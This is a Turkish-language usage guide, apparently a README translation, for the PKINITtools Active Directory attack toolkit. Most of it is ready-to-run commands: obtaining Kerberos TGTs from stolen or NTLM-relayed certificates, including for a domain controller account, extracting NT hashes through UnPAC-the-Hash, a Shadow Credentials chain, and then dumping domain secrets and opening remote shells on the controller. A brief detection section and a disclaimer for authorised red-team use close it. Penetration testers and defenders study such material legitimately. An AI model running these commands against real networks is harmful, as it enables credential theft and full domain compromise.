# 🎫 PKINITtools - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English Version](../README.md)

```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Doğrulaması, Shadow Credentials ve UnPAC-the-Hash Araç Seti
```

<p align="center">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Geliştirici-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Kategori-Active_Directory_&_Ağ-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/Lisans-MIT-red?style=for-the-badge" alt="Lisans MIT">
</p>

<p align="center">
  <b>🌐 Kerberos Açık Anahtar Kriptografisi (PKINIT) ile sertifikaları TGT biletlerine dönüştüren ve NT hash'lerini kurtaran araç seti</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış & PKINIT Mimarisi](#-genel-bakış--pkinit-mimarisi)
- [Temel Araçlar: `gettgtpkinit.py` & `getskeyhash.py`](#-temel-araçlar-gettgtpkinitpy--getskeyhashpy)
- [Kurulum](#-kurulum)
- [AD CS Sertifikalarını Kerberos TGT Biletine Dönüştürme](#-ad-cs-sertifikalarını-kerberos-tgt-biletine-dönüştürme)
  - [PFX Dosyası Kullanarak](#pfx-dosyası-kullanarak)
  - [Base64 Kodlu Sertifika ile (Relay Zincirleri)](#base64-kodlu-sertifika-ile-relay-zincirleri)
- [NT Hash'ini Kurtarma (UnPAC-the-Hash)](#-nt-hashini-kurtarma-unpac-the-hash)
- [Shadow Credentials Saldırı Döngüsü](#-shadow-credentials-saldırı-döngüsü)
- [TGT Biletini Impacket & NetExec ile Kullanma](#-tgt-biletini-impacket--netexec-ile-kullanma)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Açısından Değerlendirme & Tespit](#-savunma-açısından-değerlendirme--tespit)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış & PKINIT Mimarisi

**PKINIT** (Public Key Cryptography for Initial Authentication in Kerberos, **RFC 4556**), Kerberos protokolünün bir uzantısıdır. Bir kullanıcının Kerberos TGT (Ticket Granting Ticket) talep edebilmesi için gizli parola hash'ini (NTLM veya AES) sunması yerine, **X.509 dijital sertifikaları ve açık/özel anahtar çiftleri** ile kimliğini doğrulamasını sağlar.

Ünlü Active Directory araştırmacısı **Dirk-jan Mollema (@_dirkjan)** tarafından geliştirilen **PKINITtools** şu kritik işlevleri yerine getirir:
1. Ele geçirilen veya NTLM Relay ile üretilen dijital sertifikaları kullanarak Domain Controller'dan Kerberos TGT (`.ccache`) alır.
2. **UnPAC-the-Hash** mekanizmasını işleterek kullanıcının / makinenin statik **NTLM Hash'ini** doğrudan açığa çıkarır.

---

## 🧰 Temel Araçlar: `gettgtpkinit.py` & `getskeyhash.py`

- **`gettgtpkinit.py`**: Port 88 üzerinden KDC ile konuşarak sertifikayı sunar ve TGT biletini diske ccache veya kirbi dosyası olarak yazar.
- **`getskeyhash.py`**: PKINIT biletindeki PAC_CREDENTIAL_INFO yapısını KDC ile çözerek hesabın orijinal NT hash'ini hesaplar.

---

## 📥 Kurulum

```bash
# GitHub deposunu klonlama
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Bağımlılıkları yükleme (impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```

---

## 🎫 AD CS Sertifikalarını Kerberos TGT Biletine Dönüştürme

Certipy veya Coercer + ntlmrelayx ile elde edilen sertifikaları TGT'ye dönüştürme:

### PFX Dosyası Kullanarak

```bash
# İstemci sertifikası dosyası (.pfx) ile TGT bileti isteme
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'SertifikaParola123' corp.local/administrator admin.ccache
```

### Base64 Kodlu Sertifika ile (Relay Zincirleri)

`ntlmrelayx` AD CS ESC8 saldırılarında sertifikayı doğrudan Base64 metin olarak ekrana basar:

```bash
# Base64 sertifikayı doğrudan Domain Controller makine hesabı (DC01$) TGT'sine çevirme
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```

---

## 🔑 NT Hash'ini Kurtarma (UnPAC-the-Hash)

Bir hesap PKINIT ile doğrulandığında, Domain Controller PAC yapısı içerisine geçici bir AS-REP anahtarıyla şifrelenmiş **statik NTLM hash'ini** yerleştirir. `getskeyhash.py` bu yapıyı çözer:

```bash
# Biletten doğrudan NTLM hash'ini çekme
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Çıktı:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

Elde edilen NT hash ile doğrudan **Pass-the-Hash** yapılabilir veya parola kırıcıya verilebilir!

---

## 👥 Shadow Credentials Saldırı Döngüsü

Bir Active Directory nesnesi üzerinde yazma yetkiniz (`GenericAll`, `GenericWrite`, `msDS-KeyCredentialLink` üzerinde `WriteProperty`) olduğunda:

```bash
# 1. pyWhisker ile hedef kurban nesneye yeni bir anahtar kimliği enjekte etme
pywhisker.py -d "corp.local" -u "dusuk_user" -p "Parola123" --target "HedefKullanici" --action "add" --export "hedef.pfx"

# 2. Sahte sertifika ile PKINITtools üzerinden TGT talep etme
gettgtpkinit.py -cert-pfx hedef.pfx -pfx-pass "pywhisker" corp.local/HedefKullanici hedef.ccache

# 3. Hedef kullanıcının NT Hash'ini açığa çıkarma
getskeyhash.py corp.local/HedefKullanici hedef.ccache
```

---

## 🚀 TGT Biletini Impacket & NetExec ile Kullanma

Elde edilen `.ccache` dosyasını ortama aktarın:

```bash
# Kerberos bilet önbelleğini ortam değişkenine atama
export KRB5CCNAME=/yol/admin.ccache

# Parola girmeden Impacket ile etki alanı sırlarını (secrets) dökme
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Kerberos biletiyle Evil-WinRM oturumu açma
evil-winrm -i dc01.corp.local -r corp.local

# NetExec ile Kerberos doğrulamalı komut çalıştırma
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```

---

## ⚡ Hızlı Referans Tablosu

| İşlem | Komut |
|-------|-------|
| **PFX Dosyası ile TGT Al** | `gettgtpkinit.py -cert-pfx <DOSYA.pfx> <DOMAIN>/<USER> <CIKTI.ccache>` |
| **Base64 Sertifika ile TGT Al**| `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <CIKTI.ccache>` |
| **DC IP'sini Belirterek Al** | `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <SERT> <DOMAIN>/<USER> <TGT>` |
| **UnPAC-the-Hash (NTLM Al)** | `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| **Bileti Impacket'e Ver** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| **Bileti NetExec'e Ver** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ Savunma Açısından Değerlendirme & Tespit

1. **Event ID 4768 (TGT Talebi):** PKINIT kullanıldığında Kerberos ön doğrulama türü (Pre-Authentication Type) alanı `16` (PKINIT) olarak kaydedilir.
2. **`msDS-KeyCredentialLink` Değişiklikleri:** Event ID 5136 logları izlenmeli, Azure AD/Intune dışındaki hesaplara anahtar kimliği eklenmesi alarm olarak değerlendirilmelidir.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> Bu kılavuz yalnızca izinli Active Directory güvenlik denetimleri ve Red Team operasyonları için hazırlanmıştır. Yetkisiz bilet manipülasyonu ve kimlik taklidi yapmak yasalara aykırıdır.